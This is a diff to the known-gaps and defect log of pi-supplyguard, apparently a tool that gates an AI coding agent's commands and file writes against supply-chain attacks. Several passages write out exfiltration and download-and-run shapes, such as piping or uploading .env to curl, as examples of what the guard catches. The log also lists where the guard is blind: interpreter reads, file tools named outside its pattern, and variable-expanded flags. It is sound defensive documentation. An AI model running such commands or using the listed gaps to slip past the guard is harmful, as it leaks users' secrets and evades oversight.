@@ -1,8 +1,10 @@
 # Known Gaps and Defect Log
 
-**Status:** M1–M6, M8 and M9 complete. M7 complete for scans and provider
-health; Socket Firewall deliberately not implemented (§1.5).
-**Last updated:** 2026-09-02
+**Status:** M1–M6 and M8–M18 complete. M7 complete for scans and provider
+health; Socket Firewall and manifest scan out of scope by decision
+(§1.5, 2026-10-14). The execution classifier (M17) is experimental and
+paranoid-only (§1.20).
+**Last updated:** 2026-10-14
 
 This document is deliberately blunt. `pi-supplyguard` is a security control, and
 a security control that overstates its coverage is worse than none: it converts
@@ -100,16 +102,31 @@ the file back (or approve the change), not to keep retrying.
 
 ### 1.3 Generic policy coverage stops at the shapes SPEC 15 names
 
-Installer pipelines and GitHub Actions references are enforced. Three edges are
-not, and each is a deliberate line rather than an oversight:
+Installer pipelines and GitHub Actions references are enforced. Four edges
+that used to be listed here are closed (M12):
 
-- **A download and its execution in two steps.** `curl -o i.sh …; sh i.sh` is a
-  `NetworkRequirement`, not a pipeline: the file is on disk to be read, which is
-  exactly the distinction SPEC §15.2 draws. Whether the agent then reads it is
-  not something SupplyGuard can see.
-- **Container image digests.** `uses: docker://alpine:3` is treated as
-  out-of-scope rather than as a mutable reference. Pinning image digests is the
-  same idea applied to a different registry, and it belongs with M9.
+- **A download and its execution in two steps.** `curl -o i.sh …; sh i.sh` is
+  still two events, but the second one no longer looks fresh: the generic
+  adapter remembers every download target for the session, and executing a
+  remembered file — in the same command or in a later call — is a
+  `SecurityBypass` denied in every profile. The file remains on disk to be
+  READ before it is run, which is the honest escape: review it, then run it
+  from a command that says so.
+- **Container image digests.** `docker://alpine:3` is a mutable reference
+  exactly like `actions/checkout@v4`; only `docker://image@sha256:<64 hex>`
+  counts as pinned. Same gate, same profiles.
+- **Scoped-checksum self-exemption.** `GOPRIVATE=github.com/foo/* go get
+  github.com/foo/bar@v1.2.3` — a scope that happens to cover the module being
+  added — is a `ChecksumBypass` for that add, denied in every profile. The
+  scoped pattern itself stays legal (§2.1); exempting the dependency you are
+  taking on, in the same breath, is not.
+- **Out-of-band writes are attributed.** A tracked file changed while no tool
+  call was executing (a background process, a `python3 rewrite.py` that
+  outlived its call) is reported with its timing — an `out-of-band-write`
+  audit record and a warning — on top of the next call's reconciliation,
+  which remains the gate. Best effort: `fs.watch`, no new dependency.
+
+Still a deliberate line, not an oversight:
 - **Mutable references already committed** are reported as audit notes on gated
   operations, not as a gate. Denying every command in a repository whose
   workflows predate SupplyGuard would make the profile unusable on arrival;
@@ -127,7 +144,10 @@ are structural rather than temporary:
 - **With no corpus it does nothing.** SPEC §12.6 requires exactly that: the tool
   has no way to know which `foo/bar` is the real one, and a version that guessed
   would produce confident nonsense about ownership. Paranoid says so in the
-  approval prompt; no profile denies for the absence alone.
+  approval prompt; no profile denies for the absence alone. Mitigated since M14:
+  `/supplyguard-trust init` seeds `.supplyguard-trust.yaml` from the
+  repository's own `go.mod` in one command, so the common case (protect what you
+  already use) costs nothing.
 - **The corpus is not an allow-list.** A module that is absent is not
   "untrusted"; it is simply not something a typo could be aimed at. An attacker
   registering a name that resembles nothing protected is invisible to this
@@ -140,10 +160,20 @@ are structural rather than temporary:
   adjacent transpositions cost one edit, a transposed pair edited again does
   not. That is the typo people actually make, and the unrestricted algorithm
   costs more for cases nobody types.
-- **No Unicode or homoglyph normalization.** SPEC §12.3 lists it as optional
-  future work, and a Cyrillic `о` in a module path would pass this check today.
+- **Homoglyph normalization is in (M14)**: a deliberately small, auditable
+  Latin-lookalike table (Cyrillic `о`/`р`/`ѕ`, Greek `ν`, …) folds onto ASCII
+  before any comparison, pinned by a Cyrillic-typosquat replay. What remains
+  out: full Unicode confusables (the Unicode `confusables.txt` set) and
+  mixed-script detection (an identifier mixing scripts is itself a signal).
 
 ### 1.5 Socket is the CLI only: no Firewall, and no manifest scan
+
+
+**Scope decision, 2026-10-14 (supersedes the 2026-09-02 framing below):**
+Socket Firewall and the manifest scan are OUT OF SCOPE and not planned.
+SPEC §25's v1.0 criteria and §13 were amended the same day, so Firewall is
+no longer "mandatory for Paranoid" anywhere. The text below is kept as the
+honest description of what the Socket CLI integration does not do.
 
 Human decision, 2026-09-02: M7 integrates the **Socket CLI**
 (`socket package score`), not Socket Firewall. What that leaves undone is
@@ -171,12 +201,12 @@ or `socket login`, every artifact scan is therefore `unavailable` — which
 That is SPEC §13.4 working as designed, not a defect, but it is the kind of
 thing that gets a profile switched off if it arrives as a surprise.
 
-**Never exercised against the real CLI.** The command, the purl form and the
-`{ok, data:{self:{score,alerts}}}` document shape were read out of the published
-`socket@1.1.163` bundle, and every behaviour is tested against an injected
-runner — no test starts a process. A CLI change would surface as `unavailable`
-(the conservative direction) rather than as a wrong verdict, because an
-unrecognized document is never read as clean.
+**Live contract tests exist now (M14, D18's lesson).** The weekly CI job runs
+`test/live/live.test.ts` against the real proxy, the real OSV and the real
+Socket CLI (`LIVE=1` only; the normal suite stays hermetic). The purl form and
+document shape were originally read out of the published `socket@1.1.163`
+bundle; D18 then proved injected runners can hide live breakage, which is why
+the contract tests run against reality on a schedule.
 
 The approval object is still partial. SPEC §11.2 lists vulnerability findings,
 similarity findings and transitive impact alongside the purpose, stdlib and
@@ -391,19 +421,36 @@ omp (oh-my-pi) exposes tools Pi does not. What each one gets:
 omp subagents run headless, so a dependency `ASK` in a subagent fails closed
 and the Chief-only dependency rule (§2.8) holds.
 
-### 1.15 Artifact source is never analyzed
+### 1.15 Artifact content: a local heuristic scan, and its limits
 
 A dependency heading for a human gate is checked for known vulnerabilities
-(OSV), known alert shapes (Socket) and identity confusion (§1.4) — but nothing
-reads the code itself. Novel malware in an otherwise plausible package, the
-one attack none of those can name, passes every check SupplyGuard has and
-reaches the approval prompt looking clean.
+(OSV), known alert shapes (Socket) and identity confusion (§1.4) — and, since
+M10, by a **local, deterministic, offline content scan** of the module's own
+source (`src/analyzers/content.ts`): import-time egress and execution,
+environment harvesting beside a network call, large encoded blobs, cgo
+`dlopen`, and `//go:generate` directives inside the dependency, each reported
+with file and line as an `ArtifactAnomaly` event the human reads as code.
+What the scan is honest about: it is a heuristic for lazy and templated
+malware, and a determined author defeats it. Vendor quarantine and the
+hermetic build gate (M11) are the depth behind it.
 
-Human decision, 2026-09-27: close this with an **experimental external
-provider** built on Jev (TypeSafe AI's System One typed-decision model), and
-only that. The agreed shape:
+Two boundaries of the evidence, deliberate:
 
-- a `src/providers/jev/` peer of the Socket provider, feeding the same
+- **The scan needs local source.** `vendor/<module>` or the module cache. At
+  approval time the fetch usually has not happened yet, so the common case is
+  an explicit "content not inspected yet" banner at the ask — in every
+  profile, because denying there would block every legitimate `go get`. The
+  paranoid denial for uninspected content lands at the M11 build gate, where
+  the source exists and the scan can actually run.
+- **`go.sum` moves are semantic now**: which module moved, from and to which
+  version, in the event summary and as scan targets.
+
+Human decision, 2026-09-27 (amended the same day): the baseline fix is the
+**local scanner** above — no provider, no key. **Jev** (TypeSafe AI's System
+One typed-decision model) is an *optional* external analyzer behind the same
+interface — one seat among several, never a dependency:
+
+- `src/providers/jev/` is a peer of the Socket provider, feeding the same
   `withExternalEvidence` channel — additive only, never a fifth decision;
 - configuration `jev.enabled`, **default off**, marked `experimental` in
   status and audit records;
@@ -415,12 +462,140 @@ only that. The agreed shape:
 - **public modules only**: source is read from `vendor/` or the module cache
   and sent nowhere if `GOPRIVATE`/`GONOPROXY`/`GOPROXY=off` covers the module;
 - the model's explanation text is untrusted display data, never instructions;
-- `JEV_API_KEY` never enters audit, logs or prompts; caching is per
+- `TYPESAFE_API_KEY` (or `JEV_API_KEY` as a fallback spelling) never enters
+  audit, logs or prompts; caching is per
   module@version and content hash; tests use an injected `fetch`.
 
-Deferred until the P0 hardening batch (vendored-source writes, §1.9, §1.10's
-audit trail) landed; those are done, so nothing blocks the provider but the
-decision to switch it on.
+No gate keys on Jev or on any remote analyzer: "content inspected" means the
+local scanner ran over the artifact's actual source. The design is falsified
+by any test that passes only with a Jev key or endpoint available; CI runs the
+milestone suite once with `src/providers/jev/` excluded to prove it.
+Implementation is planned on `feature/zero-day-hardening`
+(`docs/PLAN-ZERO-DAY.md`).
+
+The M10 scanner and the optional Jev analyzer shipped on
+`feature/zero-day-hardening` (`docs/PLAN-ZERO-DAY.md`), and M11 adds the depth
+behind them:
+
+- **Hermetic gate:** `-mod=mod` on a build-shaped command with a vendor tree
+  present is denied in every profile — it fetches from the network instead of
+  compiling the reviewed tree, un-enforcing the vendor model one flag early.
+  Building from the tree, including `GOFLAGS=-mod=vendor GOPROXY=off` spells,
+  stays free.
+- **Vendor quarantine (paranoid):** before the first build-shaped command that
+  would compile vendored code, every vendored module is content-scanned —
+  lazily, once per process, from the vendor tree itself. A finding becomes an
+  `ArtifactAnomaly` the human reads before the code runs; a clean module is
+  scanned once and stops costing anything. Session-scoped by design, like the
+  manifest baseline: a restart re-scans on the next build.
+
+
+### 1.16 npm: enforced where the incidents are, honest about the rest
+
+The npm adapter (M13) covers the vector the incident record names: **lifecycle
+scripts in dependencies**. Every dependency the lockfile marks
+`hasInstallScript` is reported on gated operations, with the script body read
+from `node_modules` and shown in the approval prompt; an unpopulated tree
+reports the flag alone. `npm|pnpm|yarn|bun` installs, adds, removals, global
+installs and `npx`/`dlx` fetch-and-run are gated through the same
+shell-aware parser as Go, `package.json` and `package-lock.json` changes are
+semantic (which package moved, which direction), and `node_modules/` is a
+write-guard prefix like `vendor/`.
+
+What it deliberately does NOT do yet, each with a reason:
+
+- **No exact-version floor for ranges.** `^1.2.3` is npm's default; denying it
+  would make the adapter unusable on arrival. Bare names, `*` and dist-tags
+  (`latest`, `next`) carry the same deny floor as Go's floating versions —
+  they mean the same thing: the registry decides what runs. Exact pins and
+  ranges both proceed to the trust pipeline, ranges labeled as ranges.
+- **No release-age, OSV or content scan for npm artifacts** (the Go-shaped
+  scanner reads `.go` files). The evidence for an npm dependency today is its
+  declared scripts, its lockfile metadata, and the justification.
+- **pnpm/yarn lockfiles are gated coarsely** (one `LockfileMutation`), not
+  semantically.
+
+### 1.17 Freshness: contract tests, replays, signals — each bounded
+
+M14 closes the "is it even live?" question three ways, and each way states its
+own limit:
+
+- **Incident replay corpus** (`test/core/replay.test.ts`): event-stream,
+  node-ipc, ua-parser-js, the `go generate` install shape and a Cyrillic
+  typosquat, replayed end-to-end against the real runtime. A replay passing
+  silently fails the build. Limit: these are FIVE incidents, shape-matched, not
+  a survey — xz-style build-system compromise (not agent-mediated) is not
+  represented because SupplyGuard does not sit in that path.
+- **Live contract tests** (`test/live/live.test.ts`, `LIVE=1`): real proxy,
+  real OSV, real Socket CLI, weekly in CI. Limit: they prove the plumbing
+  answers, not that verdicts are right.
+- **Repository signals** (`src/providers/signals/`, `signals.enabled`, default
+  off): transferred or archived repositories and first-mover repos (fresh
+  pushes, no history) add an ask to the artifacts they back. Advisory and
+  additive-only; an unreachable API withholds nothing. Limit: class C is the
+  weakest of the threat classes — a signal is a reason to look, not a verdict.
+
+CI (`.github/workflows/`) runs the hermetic suite on every push and the live
+contracts weekly; both pin their actions to full commit SHAs, which is what
+SupplyGuard itself demands of a workflow.
+
+### 1.18 Local policy rules: shapes and paths, by design
+
+M15 lets the operator add offline rules (`policies:` in configuration, SPEC
+§8.5). What a rule can see is deliberately narrow, and each limit is a
+decision recorded in `docs/PLAN-LOCAL-POLICY.md`:
+
+- **No `allow` rules.** A rule can only tighten. Silencing a specific warning
+  is a one-shot prompt decision, not standing configuration.
+- **No content matching.** Rules see argv, tool names and path operands —
+  never the bytes of a file. `python3 rewrite.py` touching `infra/` is
+  invisible to a `writePrefix: infra/` rule unless the path appears on the
+  command line (the same boundary as §1.1's sensitive-write detection).
+- **No regex.** Exact command names, substring arguments, prefixes and
+  Node's `path.matchesGlob`. A richer grammar is attack surface.
+- **Shape, not intent.** `argsContain: ["--force"]` matches `--force-with-lease`
+  too — substring semantics, stated in SPEC — and a variable that expands to
+  the flag (`git push $F`) is not seen. The shell parser marks such words
+  `expanded`; rules do not yet treat that as a match.
+- **Path normalization is lexical.** `./x`, `a/../x` and absolute paths inside
+  the repository are folded; symlinks are not resolved.
+- **Rule matches are not audited separately** from the decision they feed:
+  the audit record carries the rule's finding (`rule:<id>`), not a per-rule
+  hit counter.
+
+### 1.19 Sensitive-data rails: operands, not programs
+
+M16 (SPEC §8.6) gates sensitive-path access by command shape. Pinned in
+`test/policy/adversarial.test.ts` as honest negatives:
+
+- **Interpreters reading files are invisible.**
+  `python3 -c "open('.env').read()"` names no operand. In paranoid, the
+  execution classifier (§1.20) is the only layer that can see it.
+- **Input redirection is not parsed** (`curl -d @- < .env`): the shell
+  grammar records output redirections only.
+- **The corpus is names, not content.** A secret in `config/app.yaml` is not
+  sensitive unless `sensitive.neverSend` says so.
+- **Live agent smoke (2026-10-14, omp headless):** the ask tier held —
+  `cat .env.local` was gated, the agent reported the gate without
+  bypassing, the file content never entered the model's context, and
+  `ls -la` ran untouched. Prompts shaped like exfiltration are refused by
+  the model provider before a tool call exists, so the DENY tier is proven
+  through the real runtime (`onToolCall`) in the suite, not through a live
+  agent.
+
+### 1.20 Execution classifier: experimental by design
+
+M17 (SPEC §8.7):
+
+- **Probabilistic.** It misses things and flags scary-but-fine commands; it is
+  capped at `ask` until its precision has been observed.
+- **Fail-soft, deliberately.** An unreachable classifier warns and local
+  policy stands — unlike Socket in paranoid. Documented deviation.
+- **Command text leaves the machine** in paranoid when enabled: redacted, but
+  redaction is pattern-based and can miss a credential of an unknown shape.
+- **Only one script per command** is read for stage 2, up to 256 KiB.
+- **Unproven against the live endpoint** until the `LIVE=1` canary has run
+  with a key (D18's lesson).
 
 ---
 
@@ -771,6 +946,108 @@ given severity once; the same name at a different severity stays a separate
 alert, so the worst severity is never lost. Found while testing D18's fix
 against the installed CLI.
 Pinned by *"an alert repeated in the transitive section is reported once"*.
+
+### D20 — the npm lockfile parser read a layout npm stopped writing in 2020
+
+**Severity: high.** `parsePackageLock` read only the legacy flat `dependencies`
+map. npm 7 (lockfileVersion 2/3) moved everything to
+`packages["node_modules/<name>"]` and v3 drops the flat map entirely, so on
+every modern repository the parser saw an **empty dependency graph**:
+
+```text
+packages: { "node_modules/gotpkg": { version: "1.0.0", hasInstallScript: true } }
+                                   -> was: parsed as zero dependencies
+```
+
+Three consequences, all proven against the p4 lab scenario
+(`supplyguard-lab/p4-npm-lifecycle`, a real v3 lockfile): an indirect lockfile
+rewrite fell through to the Go adapter's catch-all and was gated only coarsely,
+mislabeled `[go]` and naming no package; the lifecycle-script scan
+(`inspectProjectState`) had nothing to report, so `npm ci` prompts carried no
+per-package evidence; and `diffLock` compared **by name only**, so
+`evil@1.0.0 → evil@9.9.9` inside the lockfile was invisible in both layouts.
+The existing lifecycle test encoded the wrong assumption — it wrote
+`lockfileVersion: 3` with a flat `dependencies` map, a shape npm never emits.
+Fixed by parsing both layouts (nested trees, `link:` entries skipped), diffing
+version changes as first-class changes, and narrowing the Go adapter's
+mutation catch-all to Go-owned files so npm's manifests can no longer be
+claimed with the wrong label. A no-op entry diff on a changed lockfile
+(`resolved`/`integrity` rewritten in place) now gates coarsely instead of
+silently.
+Pinned by *"lockfileVersion 3 `packages` layout is read, not just the legacy
+flat map"*, *"a version swap inside the lockfile is a named change, not
+silence"*, and *"an indirect mutation of a v3 lockfile names the package,
+labeled npm"*; all fail without the fix.
+
+### D21 — a file-tool write into node_modules/ or vendor/ was invisible
+
+**Severity: high.** The pre-execution write guard read only shell commands —
+`sed`, `tee`, `cp` and friends via `writtenPaths`. An `edit`/`write` tool call
+names its target in a tool-input field instead, and nothing looked there:
+
+```text
+edit { path: "node_modules/evil/index.js", ... }   -> was: proceeded silently
+write { file_path: "/repo/node_modules/…", ... }   -> was: proceeded silently
+```
+
+Guarded trees are not snapshotted (§1.8 records why), so the pre-execution
+shape is the **only** place this write is ever visible — the bash-side test
+existed, the file-tool side was the bypass. Found in the p4 lab. Fixed by
+`inspectNonShellWrite`: a write-named tool (`edit`, `write`, `patch`, `save`,
+`create`, `apply`, `notebook`) carrying a whole-token path value that hits a guard prefix
+(`VendorDrift`) or a watched manifest (`LockfileMutation`) are gated before the
+write lands. Reads are never taxed, and prose that mentions a guarded path
+carries quotes or parentheses and is excluded by the token shape.
+Residual, deliberate: detection is tool-name-shaped, so a host file tool named
+outside the pattern escapes this guard (manifests still reconcile via snapshot;
+guarded trees do not).
+Pinned by *"an edit-tool write into node_modules is gated, not only shell
+commands"* and *"an edit-tool write into a guarded tree is a VendorDrift before
+it lands"*; both fail without the fix.
+
+### D22 — a project rule could displace a global rule by reusing its id
+
+**Severity: high (tighten-only violation).** M15's first merge deduped rules
+by id and kept the "stricter" decision, so a project `deny` with a pattern
+that never matches replaced the operator's global `ask` for `kubectl` —
+silently switching off the global protection. Found during the ponytail
+simplification; layers now concatenate and both rules apply.
+Pinned by *"a project rule reusing a global rule's id cannot displace it"*
+(fails on the old merge).
+
+### D23 — redaction kept the bearer token
+
+`Authorization: Bearer <token>` went through the `key: value` rule first,
+which redacted the word "Bearer" and left the token. Bearer now runs first.
+Pinned by *"redaction strips credential shapes before anything leaves"*.
+
+### D24 — a piped read was only asked about
+
+**Severity: high.** `cat .env | curl -d @- https://…` produced the read tier
+(ask), not the exfiltration tier: only tools *naming* the file were egress.
+A sensitive read piped through any stages of its own pipeline into a network
+tool is now denied. Pinned by *"exfiltration shapes are denied, not merely
+asked about"*.
+
+### D25 — the ssh key carve-out swallowed curl uploads
+
+**Severity: high.** The rule "a key passed by flag is a path used, not read"
+(`ssh -i key`) applied to every tool, so curl's `-F file=@.env` skipped its
+upload value; `wget --post-file=.env` was not read at all. The carve-out is
+now scoped to the ssh family, and `=`-joined and `key=@path` values are read.
+Pinned by the same test as D24.
+
+### D26 — repository signals were silently inert without Jev
+
+**Severity: medium (an enabled control doing nothing).** The signals block
+sat behind the Jev early returns in `externalEvidenceFor`, so
+`signals.enabled: true` consulted the provider only when `jev.enabled` was
+also on AND a key existed. An operator who turned signals on without Jev
+got no signals, no warning, no audit line. Found during the M16–M18 wrap-up
+review; signals are now gated by their own flag alone, and the runtime grew
+a signals transport seam so the path is testable hermetically.
+Pinned by *"signals.enabled works with Jev off and no key (D26)"* (fails on
+the old wiring: the provider is never consulted).
 
 ---
 
